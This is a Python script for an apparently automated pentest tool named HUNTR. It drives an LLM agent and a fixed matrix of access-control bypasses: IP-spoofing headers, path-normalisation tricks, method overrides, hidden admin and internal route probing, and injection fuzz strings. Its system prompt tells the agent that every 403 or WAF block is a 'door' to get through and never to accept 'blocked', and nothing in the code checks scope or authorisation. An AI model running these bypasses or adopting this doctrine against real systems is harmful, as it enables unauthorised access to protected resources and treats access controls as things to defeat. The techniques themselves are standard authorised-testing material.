#!/usr/bin/env python3
"""
agent-bypass.py — "DOORS NOT WALLS" engine. A 403/404/405/500/WAF is a signal, not a stop.

An AI agent treats every block as an opening and drives deterministic bypass matrices to walk
through it:
  • 403 → the resource EXISTS and is worth protecting. Header spoofs (X-Forwarded-For, X-Original-URL,
    X-Rewrite-URL), path tricks (//, /./, /%2e/, trailing ; / %20 ..;/), method override, case.
  • 404 → the route is hidden but siblings exist. Probe neighbours, versioned/shadow routes.
  • 405 → wrong method. Try the others (POST/PUT/PATCH/DELETE/OPTIONS/HEAD) — the verb is the gate.
  • 500 → your input BROKE server logic — that's an injection/logic signal, not a dead end.
  • WAF/429 → something behind it is worth filtering. Encode, fragment, header-bypass.

Proof is deterministic: a variant that reaches real content (status/size/markers diverge from the
block) = bypass PROVEN. The intelligence (which technique, how to adapt) is the agent's.

stdin : {"url":"...","status":403,"method":"GET","session_cookie"?:"..."}
stdout: {"ok":true,"bypassed":bool,"technique":"...","variant":"...","evidence":"...","reply":"...","tool_calls":[...]}
"""
import sys, os, json, re, importlib.util
from urllib.parse import urlparse, urlunparse, quote
import agent_core as A

_HL = None
def _huntrlib():
    global _HL
    if _HL is None:
        spec = importlib.util.spec_from_file_location("huntrlib", str(A.HERE / "huntrlib.py"))
        _HL = importlib.util.module_from_spec(spec); spec.loader.exec_module(_HL)
    return _HL

d = A.read_stdin_json()
url = (d.get("url") or "").strip()
if not url.startswith("http"):
    A.emit({"ok": False, "error": "need http url"})
status = int(d.get("status", 0) or 0)
method = (d.get("method") or "GET").upper()
if d.get("session_cookie"):
    A.set_identity("session", cookie=d["session_cookie"])
elif d.get("session_token"):
    A.set_identity("session", authorization=d["session_token"])


def _spine(method, u, headers=None):
    try:
        return _huntrlib().spine(u, method=method, headers=headers)
    except Exception as e:
        return {"ok": False, "status": 0, "headers": "", "body": "", "raw": str(e)[:100]}


def bypass_matrix(inp):
    """Run the deterministic bypass matrix for the block type and report any variant that gets through."""
    u = inp.get("url") or url
    p = urlparse(u)
    base_block = _spine(method, u)
    block_len = len(base_block.get("body", "") or "")
    results = []

    def _try(label, m, vu, headers=None):
        r = _spine(m, vu, headers)
        st = r.get("status", 0); ln = len(r.get("body", "") or "")
        # "through" = a success-ish status that differs from the block, with content
        through = st and st < 400 and st != status and (ln > block_len + 20 or abs(ln - block_len) > 50)
        results.append({"technique": label, "status": st, "len": ln, "through": bool(through), "url": vu, "method": m})
        return through

    if status in (401, 403):
        for h in [{"X-Forwarded-For": "127.0.0.1"}, {"X-Forwarded-Host": "127.0.0.1"},
                  {"X-Original-URL": p.path}, {"X-Rewrite-URL": p.path}, {"X-Custom-IP-Authorization": "127.0.0.1"},
                  {"X-Originating-IP": "127.0.0.1"}, {"X-Remote-Addr": "127.0.0.1"}, {"Referer": p.scheme + "://" + p.netloc}]:
            _try("hdr:" + list(h)[0], method, u, h)
        for tr in [p.path + "/", p.path + "/.", "/%2e" + p.path, p.path + "%20", p.path + "%09",
                   p.path + ";", p.path + "..;/", p.path.rstrip("/") + "//", p.path.upper()]:
            _try("path:" + tr[-12:], method, urlunparse(p._replace(path=tr)))
        for m in ["POST", "PUT", "HEAD", "OPTIONS", "TRACE", "PATCH"]:
            _try("method:" + m, m, u)
    elif status == 405:
        for m in ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]:
            if m != method:
                _try("method:" + m, m, u)
    elif status == 404:
        # sibling / versioned / shadow route probing
        segs = [s for s in p.path.split("/") if s]
        cands = []
        if segs:
            last = segs[-1]
            for alt in [last + "s", last.rstrip("s"), last + ".json", last + "/", "_" + last, last + "~"]:
                cands.append("/".join(segs[:-1] + [alt]))
            for v in ["v1", "v2", "v3", "api", "internal", "admin"]:
                cands.append("/" + v + p.path)
        for c in cands[:16]:
            _try("route:" + c[-16:], "GET", urlunparse(p._replace(path="/" + c.lstrip("/"))))
    elif status >= 500:
        # the input broke logic → probe it as an injection/logic signal
        for payload in ["'", '"', "\\", "{{7*7}}", "${7*7}", "../", "%00", "[]", "null", "-1", "1e9999"]:
            q = (p.query + "&" if p.query else "") + "huntrfuzz=" + quote(payload)
            r = _spine(method, urlunparse(p._replace(query=q)))
            results.append({"technique": "500probe:" + payload, "status": r.get("status", 0),
                            "len": len(r.get("body", "") or ""), "through": False, "note": "error-signal probe"})
    thru = [r for r in results if r.get("through")]
    return json.dumps({"block_status": status, "block_len": block_len, "variants_tried": len(results),
                       "got_through": thru[:5], "sample": results[:10]})[:3500]


TOOLS = [
    A.http_tool_def(A.has_identity("session")),
    {"name": "bypass_matrix", "description": ("Run the deterministic bypass matrix appropriate to the block "
        "status (403/404/405/500/WAF). Returns every variant tried and which ones GOT THROUGH (reached real "
        "content). Use it first, then confirm a promising variant with http_request."),
     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}}},
]
handlers = {"http_request": A.http_handler, "bypass_matrix": bypass_matrix}

system = (
    "You are HUNTR's access-bypass specialist. Your doctrine: a 403/404/405/500/WAF is a DOOR, not a wall. "
    "A block means the thing behind it is worth protecting — so get through it.\n"
    "403/401: the resource exists → header spoof, path trick, method override, case. 404: the route is hidden → "
    "find the sibling/versioned/shadow route. 405: wrong verb → try the others. 500: your input broke logic → "
    "that is an injection/logic SIGNAL, probe it. WAF/429: encode/fragment/header-bypass.\n"
    "Call bypass_matrix first (it tries the whole matrix deterministically and tells you what got through), then "
    "confirm the winning variant with http_request and READ the real response. A bypass is PROVEN only when a "
    "variant reaches real protected content (status/size/markers clearly differ from the block). Adapt and "
    "combine techniques; never conclude 'blocked' until the matrix is exhausted.\n"
    "END with one line of STRICT JSON: BYPASS={\"bypassed\": true|false, \"technique\":\"<what worked>\", "
    "\"variant\":\"<url/method/header>\", \"evidence\":\"<the real response signal>\"}"
    + A.skill_for(by_name="waf-bypass-protocol", budget=1400) + A.skill_for(by_name="bypass-403", budget=1000)
)
user = f"Blocked: {method} {url} → HTTP {status}. Walk through this door."

reply, tlog, err = A.run_agent(system, user, TOOLS, handlers, max_rounds=8, max_tokens=1400, timeout=70)
if not reply:
    A.emit({"ok": False, "error": "bypass agent unavailable: " + str(err or "")[:150], "tool_calls": tlog})

bypassed, technique, variant, evidence = False, "", "", ""
m = re.search(r"BYPASS\s*=\s*(\{.*\})", reply, re.S)
if m:
    try:
        bj = json.loads(m.group(1))
        bypassed = bool(bj.get("bypassed"))
        technique = str(bj.get("technique") or "")[:80]
        variant = str(bj.get("variant") or "")[:200]
        evidence = str(bj.get("evidence") or "")[:300]
    except Exception:
        pass
A.emit({"ok": True, "bypassed": bypassed, "technique": technique, "variant": variant,
        "evidence": evidence, "reply": reply.strip(), "tool_calls": tlog})
